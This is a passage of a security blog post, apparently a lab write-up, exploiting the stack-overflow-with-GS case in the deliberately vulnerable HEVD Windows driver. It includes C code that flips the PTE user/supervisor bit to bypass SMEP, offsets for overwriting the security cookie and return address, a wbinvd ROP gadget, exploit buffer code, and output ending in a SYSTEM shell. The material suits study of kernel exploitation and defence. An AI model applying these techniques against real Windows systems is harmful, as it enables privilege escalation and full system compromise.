+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">MiGetPteAddress</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> va)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ((va <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">9</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7FFFFFFFF8</span>i64) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xFFFFF68000000000u</span>i64;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Note the value <code>0xFFFFF68000000000ui64</code>, which is the base address of the PTE. However, due to randomization, this address changes when disassembled dynamically using WinDbg:</p>
+<pre tabindex="0"><code>3: kd&gt; uf nt!MiGetPteAddress
+nt!MiGetPteAddress:
+fffff805`05af5f10 48c1e909              shr     rcx,9
+fffff805`05af5f14 48b8f8ffffff7f000000  mov rax,7FFFFFFFF8h
+fffff805`05af5f1e 4823c8                and     rcx,rax
+fffff805`05af5f21 48b80000000000a2ffff  mov rax,0FFFFA20000000000h
+fffff805`05af5f2b 4803c1                add     rax,rcx
+fffff805`05af5f2e c3                    ret
+</code></pre><p>The best way is to call this function to get the PTE address. However, since it is not an exported function, we need to find a way to obtain the address of <code>MiGetPteAddress</code>, then read the PTE base address at offset <code>0x13</code>, and use the calculation method in <code>MiGetPteAddress</code> to obtain the PTE address.</p>
+<p>There are two methods to retrieve the address of <code>MiGetPteAddress</code>:</p>
+<ol>
+<li>
+<p><strong>Search for the function signature in the kernel code section</strong>
+I used the method of calculating function signatures to search within the <code>.text</code> section of <code>ntoskrnl.exe</code>. The signature calculation follows the method in reference [6], but a different approach was used to locate the <code>.text</code> section. The reason is detailed in the <strong>Knowledge Accumulation</strong> section below.</p>
+</li>
+<li>
+<p><strong>Search for the <code>call</code> instruction in caller functions</strong>
+This method is from reference [8], which was originally used to search for the address of <code>HMValidateHandle</code> to leak kernel addresses. The same method can be used to find the address of <code>MiGetPteAddress</code>. In the functions referencing <code>MiGetPteAddress</code>, we can locate the exported function <code>MmLockPreChargedPagedPool</code>. This function is very short and calls <code>MiGetPteAddress</code> shortly after entry:</p>
+<pre tabindex="0"><code>public MmLockPreChargedPagedPool
+MmLockPreChargedPagedPool proc near
+48 83 EC 28                   sub     rsp, 28h
+4C 8B C1                      mov     r8, rcx
+E8 24 2D B7 FF                call    MiGetPteAddress
+48 8D 8A FF 0F 00 00          lea     rcx, [rdx+0FFFh]
+41 81 E0 FF 0F 00 00          and     r8d, 0FFFh
+49 03 C8                      add     rcx, r8
+41 B9 01 00 00 00             mov     r9d, 1
+48 C1 E9 0C                   shr     rcx, 0Ch
+48 8B D0                      mov     rdx, rax
+48 FF C9                      dec     rcx
+4C 8D 04 C8                   lea     r8, [rax+rcx*8]
+33 C9                         xor     ecx, ecx
+E8 A8 7E B4 FF                call    MiLockCode
+48 83 C4 28                   add     rsp, 28h
+C3                            retn
+</code></pre><p>Then, searching for the <code>E8</code> opcode yields the address of <code>MiGetPteAddress</code>.</p>
+</li>
+</ol>
+<h3 id="442-modify-the-us-field">4.4.2 Modify the U/S Field</h3>
+<p>The PTE structure is introduced in <a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">x64 Paging Mechanism</a> as follows:</p>
+<pre tabindex="0"><code>| |   62:52   |          51:12          |          11:0         |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|X|           |                         | | | | |P| | |P|P|U|R| |
+|D|     i     |           PFN           |i|i|i|G|A|D|A|C|W|/|/|P|
+| |           |                         | | | | |T| | |D|T|S|W| |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+</code></pre><p>The U/S field is located at bit 2. We only need to XOR it with <code>0x4</code> to modify the U/S field.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">ChangeUS</span>(ULONGLONG pteAddr) {
+</span></span><span style="display:flex;"><span>	PULONGLONG pte <span style="color:#f92672">=</span> (PULONGLONG)VirtualAlloc(NULL, <span style="color:#ae81ff">8</span>, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pte <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[!] FATAL: Error allocating memeory for pte</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	ReadData(pte, (PULONGLONG)pteAddr, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>	ULONGLONG pteValue <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>pte;
+</span></span><span style="display:flex;"><span>	printf(<span style="color:#e6db74">&#34;[+] Pte for shellcode is 0x%I64x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pteValue);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	BOOL status <span style="color:#f92672">=</span> WriteData(pteAddr, pteValue <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x4</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	VirtualFree(pte, <span style="color:#ae81ff">0</span>, MEM_RELEASE);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> status;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As we can see, after modifying the U/S field, the field flag in the PTE becomes <code>K</code>.</p>
+<pre tabindex="0"><code>1: kd&gt; !process  0 0 StackOverflowGS.exe
+PROCESS ffff82018712a080
+    SessionId: 1  Cid: 16f4    Peb: 5677005000  ParentCid: 1830
+    DirBase: 6de97000  ObjectTable: ffffd20318965540  HandleCount:  46.
+    Image: StackOverflowGS.exe
+1: kd&gt; .process /p ffff82018712a080
+Implicit process is now ffff8201`8712a080
+.cache forcedecodeuser done
+1: kd&gt; !pte 1c5733b0000
+                                           VA 000001c5733b0000
+PXE at FFFFF77BBDDEE018    PPE at FFFFF77BBDC038A8    PDE at FFFFF77B80715CC8    PTE at 	FFFFF700E2B99D80
+contains 0000000000000000
+contains 0000000000000000
+not valid
+1: kd&gt; !pte FFFFF700E2B99D80 1
+                                           VA fffff700e2b99d80
+PXE at FFFFF700E2B99D80    PPE at FFFFF700E2B99D80    PDE at FFFFF700E2B99D80    PTE at 	FFFFF700E2B99D80
+contains 0100000071227843  contains 0100000071227843  contains 0100000071227843  contains 	0100000071227843
+pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV  pfn 71227     ---D---KWEV
+</code></pre><h3 id="443-determine-the-overwrite-buffer-size">4.4.3 Determine the Overwrite Buffer Size</h3>
+<p>Since the destination buffer size in the vulnerable function is 512 bytes, to avoid crashes and machine reboots caused by overflows, we first set a <code>0x100</code> buffer and debug to determine the distance between the buffer starting address and the return address, as well as where <code>xored_security_cookie</code> is stored.</p>
+<pre tabindex="0"><code>3: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0x3e:
+fffff800`7468671e e8ddadf7ff      call    HEVD!memset (fffff800`74601500)
+3: kd&gt; r 
+rax=ffffac48d2424401 rbx=0000000000000000 rcx=ffffed0993030560
+rdx=0000000000000000 rsi=0000000000000100 rdi=00000036192ff5c0
+rip=fffff8007468671e rsp=ffffed0993030540 rbp=ffff8806463fb1a0
+ r8=0000000000000200  r9=000000000000004d r10=fffff80074685078
+r11=ffffed09930307c8 r12=0000000000000200 r13=0000000000000000
+r14=ffff8806463fb270 r15=ffff8806443d4a80
+iopl=0         nv up ei pl zr na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040246
+HEVD!TriggerBufferOverflowStackGS+0x3e:
+fffff800`7468671e e8ddadf7ff      call    HEVD!memset (fffff800`74601500)
+</code></pre><p>Here, we determine that the starting address of the buffer is <code>rcx=ffffed0993030560</code> and the size is <code>r8=0000000000000200</code>.</p>
+<pre tabindex="0"><code>1: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0xf6:
+fffff800`746867d6 8bc3            mov     eax,ebx
+1: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0xf8:
+fffff800`746867d8 488b8c2420020000 mov     rcx,qword ptr [rsp+220h]
+1: kd&gt; ? rsp + 220h
+Evaluate expression: -20849599772832 = ffffed09`93030760
+</code></pre><p>Here, we determine that the <code>xored_security_cookie</code> is stored at <code>ffffed0993030760</code>.</p>
+<pre tabindex="0"><code>1: kd&gt; p
+HEVD!TriggerBufferOverflowStackGS+0x11f:
+fffff800`746867ff c3              ret
+1: kd&gt; r rsp
+rsp=ffffed0993030798
+</code></pre><p>Here, we determine that the return address is stored at <code>ffffed0993030798</code>.</p>
+<p>From the above results, we determine that the offset of <code>xored_security_cookie</code> is <code>0x200</code>, and the offset of the return address is <code>0x238</code>.</p>
+<h3 id="444-tlb-cache-flushing">4.4.4 TLB Cache Flushing</h3>
+<p>In fact, before doing this step, probably because I kept reverting to a clean VM snapshot, my exploit was already successful. However, considering that this step is widely applicable in exploitation, I decided to learn it and integrate it into the exploit program.</p>
+<p>The TLB cache issue is easily resolved. We just need to execute the <code>wbinvd</code> instruction to update and invalidate the cache. Use RP++ to find the gadget address:</p>
+<pre tabindex="0"><code>0x380640: wbinvd ; ret ; \x0f\x09\xc3 (1 found)
+</code></pre><p>The final buffer structure is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Start to exploit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x248</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[+] Preparing exploit buffer!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>memset(buffer, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buffer));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// xored security cookie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>memcpy(<span style="color:#f92672">&amp;</span>buffer[COOKIE_OFFSET], <span style="color:#f92672">&amp;</span>xored_cookie, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// return address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>memcpy(<span style="color:#f92672">&amp;</span>buffer[RTN_OFFSET], <span style="color:#f92672">&amp;</span>wbinvdAddr, <span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span>memcpy(<span style="color:#f92672">&amp;</span>buffer[RTN_OFFSET<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>], <span style="color:#f92672">&amp;</span>shellcode, <span style="color:#ae81ff">8</span>);
+</span></span></code></pre></div><h3 id="45-results">4.5 Results</h3>
+<pre tabindex="0"><code>PS C:\Users\patch\Desktop&gt; C:\Users\patch\Desktop\StackOverflowGS.exe
+[+] HEVD StackOverflowGS exploit
+[+] Obtaining Driver Base Address!
+[+] HEVD.sys is located at: 0xfffff80074600000
+[+] Locating function!
+[+] fileBase is 0xfffff80074600000
+[+] elfanew is 0xd8
+[+] numberOfSections is 0x7
+[+] sizeOfOptionalHeader is 0xf0
+[+] Found .text section, not .data, continue...
+[+] Found .rdat section, not .data, continue...
+[+] hevdDataSection is 0xfffff80074603000
+[+] New cookie value is 0x414141414141!
+[+] Found StackOverflowGS.exe
+[+] StackBase is 0xffffed0992b0a000, StackLimit is 0x ffffed0992b04000
+[+] Obtaining Driver Base Address!
+[+] ntoskrnl.exe is located at: 0xfffff80072207000
+[+] ntoskrnl.exe is 0x7ff7e9f80000
+[+] NtDeviceIoControlFile is 0x7ff7ea5955f0
+[+] Anchor is 0xfffff8007281c646
+[+] AnchorAddr is ffffed0992b09a18
+[+] RSP is ffffed0992b09540
+[+] Creating shellcode.
+[+] Shellcode allocated at: 0x0000023767260000
+[+] Getting pte for shellcode.
+[+] Obtaining Driver Base Address!
+[+] ntoskrnl.exe is located at: 0xfffff80072207000
+[+] Obtaining Driver Base Address!
+[+] ntoskrnl.exe is located at: 0xfffff80072207000
+[+] ntoskrnl.exe is 0x7ff7e9f80000
+[+] MmLockPreChargedPagedPool is 0x7ff7ea6eb1e0
+MiGetPteAddress from locatefun2 is fffff800724e4f10
+[+] Rerutn from LocateFunc!
+Reading data at fffff800724e4f23
+[+] The base address of PTE is 0xfffffc0000000000
+[+] Pte Address of shellcode is 0xfffffc011bb39300
+[+] Changing U/S of pte.
+[+] Pte for shellcode is 0x4006a867
+[+] Preparing exploit buffer!
+[+] Opening handle to \\.\HacksysExtremeVulnerableDriver
+
+C:\&gt;whoami
+nt authority\system
+</code></pre><h2 id="5-knowledge-accumulation">5. Knowledge Accumulation</h2>
+<ol>
+<li>Structured Exception Handling (SEH) mechanism in 64-bit systems;</li>
+<li>/GS bypass methods;</li>
+<li>Using an arbitrary write vulnerability to achieve arbitrary read;</li>
+<li>Methods to locate the address of the <code>MiGetPteAddress</code> function, and:
+<ol>
+<li>The driver address obtained from the <code>EnumDeviceDrivers</code> function is the kernel base address. Its content cannot be read directly in user-mode code and requires an arbitrary read vulnerability. The handle obtained via <code>LoadLibraryA</code> represents the base address after loading the driver into the memory space of the current process, which can be read directly, but the PTE base address obtained this way is invalid.</li>
+<li>When obtaining the code section address, the code section base address obtained via <code>IMAGE_OPTIONAL_HEADER</code> is actually the base address of <code>.rdata</code>. Reading data sequentially from here will trigger an access violation; instead, the offset and size should be read from the <code>.text</code> <code>IMAGE_SECTION_HEADER</code>.</li>
+</ol>
+</li>
+<li>Before using <code>!pte</code> in WinDbg to display the PTE address of a virtual address, you must first switch to the context of the corresponding process.</li>
+<li>The <code>!pte</code> command throwing the error <code>Levels not implemented for this platform</code>.
+I haven&rsquo;t found a solid solution for this. I tried installing a lower version of the WDK, which resolved the issue temporarily, but it failed again when I tried it a few days later.</li>
+<li>Difference between <code>cmp</code> and <code>test</code> assembly instructions (I always get these mixed up).</li>
+<li>Methods for flushing/disabling TLB cache.</li>
+</ol>
+<h2 id="6-references">6. References</h2>
+<ol>
+<li><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">Analysis Article</a></li>
+<li><a href="https://www.cs.purdue.edu/homes/xyzhang/spring07/Papers/defeat-stackguard.pdf">Four different tricks to bypass StackShield and StackGuard protection</a></li>
+<li><a href="https://www.osronline.com/article.cfm%5earticle=469.htm#:~:text=Because%20the%20x64,within%20the%20module">Exceptional Behavior - x64 Structured Exception Handling</a></li>
+<li><a href="https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/">Exploit writing tutorial part 6 : Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR</a></li>
+<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf">Windows 10 Mitigation Improvements</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf">TAKING WINDOWS 10 KERNEL EXPLOITATION TO THE NEXT LEVEL</a></li>
+<li><a href="https://mp.weixin.qq.com/s/DuPFEdcRsFWU1VApOp5W0g">x64 Paging Mechanism</a></li>
+<li><a href="https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp">HMValidateHandle Kernel Address Leak</a></li>
+</ol>
+
+		</div>
+		<footer class="post__footer">
+			
+<div class="post__tags tags clearfix">
+	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M32 19c0 1-1 2-1 2L21 31s-1 1-2 1-2-1-2-1L2 16c-1-1-1.4-2-1.4-2S0 12.5 0 11V3C0 1.5.8.8.8.8S1.5 0 3 0h8c1.5 0 3 .6 3 .6S15 1 16 2l15 15s1 1 1 2zM7 10a3 3 0 1 0 0-6 3 3 0 0 0 0 6z"/></svg>
+	<ul class="tags__list">
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/hevd/" rel="tag">HEVD</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/exploit/" rel="tag">exploit</a>
+		</li>
+		<li class="tags__item">
+			<a class="tags__link btn" href="/tags/binary/" rel="tag">binary</a>
+		</li>
+	</ul>
+</div>
+		</footer>
+	</article>
+</main>
+
+
+
+
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2026 Logic Security.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
